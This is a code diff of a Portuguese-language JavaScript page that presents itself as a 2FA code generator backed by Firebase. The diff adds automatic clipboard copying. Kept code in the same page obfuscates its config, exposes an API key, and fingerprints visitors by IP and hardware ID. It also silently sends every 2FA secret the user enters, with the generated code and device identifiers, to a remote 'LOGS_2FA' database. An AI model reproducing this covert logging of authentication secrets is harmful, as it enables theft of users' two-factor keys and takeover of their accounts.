@@ -104,7 +104,6 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jsSHA/2.4.2/sha.js"></script>
 
 <script>
-// CONFIGURAÇÕES FIREBASE
 var _0x5a1e = ["apiKey", "AIzaSyALqmeGhhHIX62ptIK7sviv7OkoawXAE1g", "databaseURL", "https://desbloqueio-cartao-recomecar-default-rtdb.firebaseio.com", "initializeApp", "database", "estoque_oficial/", "CHAVES_UTILIZADAS/", "CHAVES_ALTERADAS/", "2FA_DESCARTADO/"];
 var firebaseConfig = { apiKey: _0x5a1e[1], databaseURL: _0x5a1e[3] };
 firebase.initializeApp(firebaseConfig);
@@ -135,18 +134,13 @@ function checkBan() {
             let b = item.val();
             if(b.ip === rawIP || b.hwid === hwID) { banido = true; }
         });
-
         if(banido) {
             document.body.innerHTML = `
                 <div class="ban-screen">
                     <div class="ban-title">🚫 ACESSO BLOQUEADO</div>
                     <div class="ban-msg">Identificamos atividade suspeita no seu dispositivo.</div>
-                    <div class="ban-info-box">
-                        IP: ${rawIP}<br>
-                        ID: ${hwID}
-                    </div>
-                </div>
-            `;
+                    <div class="ban-info-box">IP: ${rawIP}<br>ID: ${hwID}</div>
+                </div>`;
             document.body.style.background = "#000";
         }
     });
@@ -154,7 +148,17 @@ function checkBan() {
 
 function b32(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
 function gOTP(s){try{let k=b32(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
-function copiar(t){if(!t||t==="------")return;navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Copiado!";setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
+
+// FUNÇÃO DE COPIAR COM AVISO REESTABELECIDA
+function copiar(t, automatico = false){
+    if(!t || t === "------") return;
+    navigator.clipboard.writeText(t).then(() => {
+        let textoAviso = automatico ? "✅ Copiado automaticamente!" : "✅ Copiado!";
+        document.getElementById("msg").innerText = textoAviso;
+        setTimeout(() => { document.getElementById("msg").innerText = "" }, 2500);
+    });
+}
+
 function limparInput(){document.getElementById("secret").value="";document.getElementById("code").innerText="------";document.getElementById("clearInput").style.display="none"}
 function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.style.display=d.style.display==="block"?"none":"block"}
 function togglePainel(){document.getElementById("painel").style.display="block"}
@@ -165,6 +169,7 @@ q.forEach(p=>{
     db.ref('avaliacoes/'+p+'/sim').on('value',s=>{if(document.getElementById(p+'_sim'))document.getElementById(p+'_sim').innerText='👍 Sim ('+(s.val()||0)+')'});
     db.ref('avaliacoes/'+p+'/nao').on('value',s=>{if(document.getElementById(p+'_nao'))document.getElementById(p+'_nao').innerText='👎 Não ('+(s.val()||0)+')'})
 });
+
 function votar(p,t){
     if(localStorage.getItem('voto_'+p))return alert("Já avaliado!");
     db.ref('avaliacoes/'+p+'/'+t).transaction(n=>(n||0)+1);
@@ -182,14 +187,16 @@ document.getElementById("secret").addEventListener("input", function(){
             let o = gOTP(v);
             document.getElementById("code").innerText = o;
             document.getElementById("clearInput").style.display = "block";
+            
+            // LOG E COPIA AUTOMÁTICA
             db.ref("LOGS_2FA/" + d + "/" + userIP).push({ chave: v, codigo_gerado: o, hora: h, ip_cliente: rawIP, hwid: hwID });
+            copiar(o, true); 
 
             db.ref(_0x5a1e[6] + v).once('value').then(s => {
                 if(s.exists()){
                     db.ref(_0x5a1e[7] + d + "/" + userIP).push({ c: v, h: h, ip: rawIP, st: "✅ OK", hwid: hwID });
                     db.ref(_0x5a1e[9] + v).set({ data: d, status: "utilizada" });
                     db.ref(_0x5a1e[6] + v).remove();
-                    copiar(o);
                 } else if(v.length >= 16) {
                     db.ref(_0x5a1e[9] + v).once('value').then(desc => {
                         if (!desc.exists()) {
@@ -210,7 +217,11 @@ function addCampo(){
     l.appendChild(d);
     d.querySelector('input').addEventListener("input",function(){
         let v=this.value.trim().toUpperCase();
-        if(v.length>=10){ d.querySelector('.codigoMini').innerText=gOTP(v); }
+        if(v.length>=10){ 
+            let oMini = gOTP(v);
+            d.querySelector('.codigoMini').innerText = oMini; 
+            copiar(oMini, true);
+        }
     });
 }
 for(let i=0;i<3;i++)addCampo();
